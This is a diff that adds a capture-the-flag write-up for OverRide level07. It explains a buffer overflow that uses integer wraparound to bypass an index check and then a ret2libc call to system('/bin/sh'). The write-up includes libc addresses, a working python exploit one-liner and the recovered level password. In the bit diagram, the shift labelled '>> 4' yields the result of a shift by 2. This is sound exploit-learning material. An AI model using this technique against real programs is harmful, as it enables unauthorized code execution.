@@ -1,0 +1,24 @@
+The program perform a number storage based on user commands
+`store`, `read` and `quit`
+
+the storage is achieved with an integer buffer of 400 Bytes
+and here the store command make some check before writing to memory
+by for exemple blocking the action if the index we want to write is a multiple of 3
+
+here the buffer boundaries aren't checked so we can overflow the buffer to perform a ret2libc to call system()
+
+to overflow the return address the index we want to write is 114 so offseted 456 Bytes in memory
+but since it's a multiple of 3 we will use integer overflow to bypass the check
+
+      1  0000 0000  0000 0000  0000 0000  0000 0000 (2**32)
++                                      1  1100 1000 (114*4)
+=     1  0000 0000  0000 0000  0000 0001  1100 1000
+>> 4 =    100 0000  0000 0000  0000 0000  0111 0010 (1073741938)
+
+the address of the system() function [0xf7e6aed0] => 4159090384 in decimal
+the address of the "/bin/sh" string [0xf7f897ec] => 4160264172 in decimal
+
+level07@OverRide:~$> (python -c 'print "store\n" + "4159090384\n" + "1073741938\n" +  "store\n" + "4160264172\n" + "116\n" +"quit\n"'; cat) | ./level07
+
+level08@OverRide:~$> cat ~level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
